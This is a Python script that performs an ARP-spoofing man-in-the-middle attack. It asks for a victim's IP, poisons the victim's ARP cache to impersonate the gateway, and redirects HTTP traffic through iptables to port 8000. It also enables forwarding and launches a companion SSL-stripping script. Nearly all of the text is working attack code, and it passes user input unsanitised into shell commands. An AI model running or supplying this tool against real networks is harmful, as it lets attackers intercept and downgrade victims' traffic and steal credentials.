from scapy.all import *
import os
import subprocess
import time
import socket
import sys

IP_FORWARD= '/proc/sys/net/ipv4/ip_forward'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('localhost', 8000)

def http_redirection():
    print "redirecting all http traffic to port 8000"
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000")

def ip_to_mac(IP, retry= 10, timeout=2):
    arp = ARP()

    arp.op = 1

    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = IP

    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in response:
        return r[ARP].underlayer.src
    
    return None

def packetforwarding():
    with open(IP_FORWARD, 'w') as fd:
            fd.write('1')

def disablepacketforwarding():
    with open(IP_FORWARD, 'w') as fd:
            fd.write('0')


def sendARP():
    sendp(arp, iface="enp0s3")
    time.sleep(1)

http_redirection()
vIP = raw_input("Victim IP address?")

file= open("vIP.txt", "w+")
file.write(vIP)
#time.sleep(1)
print(file.read())
file.close
#time.sleep(1)

MAC = ip_to_mac(vIP)
print MAC


os.system("ping -c 1 " + vIP)
#os.system("arp -n " + vIP)

vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)

print gatewayIP

macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)

print macAttacker

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = gatewayIP
arp[ARP].hwdst = vMAC
arp[ARP].pdst = vIP


packetforwarding()
os.system("gnome-terminal -e 'python sslStrip.py' & disown")

while True:
    sendARP()





